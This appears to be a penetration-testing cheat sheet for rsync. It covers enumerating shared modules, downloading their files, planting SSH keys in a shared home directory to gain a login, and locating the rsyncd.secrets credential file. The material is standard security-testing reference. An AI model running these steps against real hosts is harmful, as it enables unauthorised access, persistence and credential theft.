# Remote Sync (Rsync)

Port 873

### 1) Enumerate Shared Folders

Nmap scan

    nmap -sV --script "rsync-list-modules" -p <PORT> <IP>

Metasploit

    msf> use auxiliary/scanner/rsync/modules_list

### 2) Manual Usage

Create a directory to use with rsync to prevent accidental file overwrite

    mkdir rsync_shared
    cd rsync_shared

List a shared folder

    rsync -av --list-only rsync://TARGET_IP/shared_name

Copy files from a shared folder

    rsync -av rsync://TARGET_IP:8730/shared_name ./rsync_shared

List and download files with credentialed authentication

    rsync -av --list-only rsync://username@TARGET_IP/shared_name
    rsync -av rsync://username@TARGET_IP:8730/shared_name ./rsync_shared

### 3) Getting SSH Access

If the user's home directory is being shared in rsync, upload your public key to authenticate

    rsync -av /home/ME/.ssh/ rsync://username@TARGET_IP/home_user/.ssh

Then, authenticate via SSH 

    ssh -i /home/ME/.ssh/id_rsa home_user@TARGET_IP

### 4) Post Exploitation

Locate the rsyncd configuration file

    find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
